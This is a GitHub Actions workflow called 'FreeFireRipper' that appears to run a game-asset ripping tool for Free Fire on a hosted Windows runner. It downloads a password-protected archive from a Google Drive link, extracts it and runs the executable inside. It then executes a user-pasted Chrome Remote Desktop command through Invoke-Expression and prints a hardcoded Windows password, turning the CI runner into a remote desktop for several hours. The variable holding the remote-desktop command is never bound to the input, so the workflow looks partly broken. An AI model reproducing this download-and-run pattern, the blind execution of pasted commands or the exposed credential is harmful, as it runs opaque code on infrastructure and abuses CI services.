name: FreeFireRipper
on:
  workflow_dispatch:
    inputs:
      code:
        description: Paste Chrome Remote Desktop Code
        required: true
      version:
        description: Choose the Ripper Version
        type: choice
        options:
          - FreeFireRipper-Basic
          - FreeFireRipper-Pro
          - FreeFireRipper-Advanced
      ffserver:
        description: Choose Your Free Fire Server ( Only For Pro and Advanced )
        type: choice
        options:
          - India
          - Others ( Contact Me to Enlist )
          
jobs:
  FFRipper:
    name: ${{ inputs.version }}
    runs-on: windows-latest

    steps:
    - name: Running ${{ inputs.version }}
      run: cd c:\temp && Invoke-WebRequest -Uri "https://drive.usercontent.google.com/download?id=1nO2wHP_jiIPREmw4XB-6u4UtrPk420c7&export=download&authuser=0&confirm=t&uuid=c1cfc8db-def1-440c-a508-e0c2909ae65f&at=AIrpjvMENwJCtzImtYnOi9oX-8RB%3A1736507853253" -OutFile "${{ github.workflow }}.7z" ; 7z x ${{ github.workflow }}.7z -p${{ github.workflow }} > $null 2>&1 ; ./ffripper.exe 
    - name: Starting Chrome Remote Desktop    
      run: Invoke-Expression $crdcode > $null 2>&1 ; Write-Host "$INSTANCE Started Enjoy Ripping"; Write-Host "Windows Password is '@GWKANG123456'";  Write-Host "Time Remaining"
    - name: Time Remaining
      run: $i = 355; do { Write-Host $i minutes; Sleep 6; $i-- ; Clear-host} while ($i -gt 0); Write-Host "Time Ended"
